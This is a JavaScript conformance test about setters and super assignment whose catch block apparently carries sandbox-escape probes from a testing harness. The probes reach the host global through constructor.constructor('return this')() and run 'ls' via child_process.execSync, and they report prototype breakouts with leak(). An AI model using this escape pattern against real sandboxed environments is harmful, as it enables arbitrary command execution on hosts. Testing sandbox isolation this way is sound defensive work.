try {
    var proto = {
        _x: 0,
        set x(v) {
            return this._x = v;
        }
    };
    var object = {
        set x(v) {
            super.x = v;
        }
    };
    Object.setPrototypeOf(object, proto);
    assert.sameValue(object.x = 1, 1, '`object.x = 1` is `1`, after executing `Object.setPrototypeOf(object, proto);`');
    assert.sameValue(object._x, 1, 'The value of `object._x` is `1`, after executing `Object.setPrototypeOf(object, proto);`');
    assert.sameValue(Object.getPrototypeOf(object)._x, 0, 'The value of `Object.getPrototypeOf(object)._x` is `0`');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}